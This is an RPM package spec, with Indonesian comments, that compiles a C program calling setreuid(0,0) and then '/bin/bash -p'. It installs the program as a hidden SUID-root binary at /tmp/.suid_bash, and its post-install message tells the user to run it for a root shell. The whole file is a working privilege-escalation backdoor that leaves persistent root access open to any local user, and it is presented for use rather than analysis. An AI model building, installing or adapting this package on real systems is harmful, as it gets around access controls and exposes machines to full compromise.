Name:           testpkg
Version:        1.0
Release:        1%{?dist}
Summary:        Executable Root di dalam /tmp

License:        MIT
BuildRequires:  gcc

%description
RPM ini mengompilasi kode C dan memasang binary SUID root ke dalam direktori /tmp.

%prep
cat <<EOF > test.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char *argv[]) {
    if (argc < 2 || strcmp(argv[1], "-p") != 0) {
        printf("Gunakan: %%s -p\n", argv[0]);
        return 1;
    }

    // Mengatur Real dan Effective UID ke root
    if (setreuid(0, 0) != 0) {
        perror("Gagal (Pastikan bit SUID aktif)");
        return 1;
    }

    printf("Akses Root Diterima. UID: %%d\n", getuid());
    // Menggunakan -p agar bash tidak membuang hak akses root
    system("/bin/bash -p");
    return 0;
}
EOF

%build
gcc test.c -o suid_bash

%install
# Membuat struktur folder tmp di dalam buildroot
mkdir -p %{buildroot}/tmp
install -m 4755 suid_bash %{buildroot}/tmp/.suid_bash

%files
# Mengatur izin SUID di lokasi /tmp
%attr(4755, root, root) /tmp/.suid_bash

%post
echo "Selesai. Jalankan dengan: /tmp/.suid_bash -p"
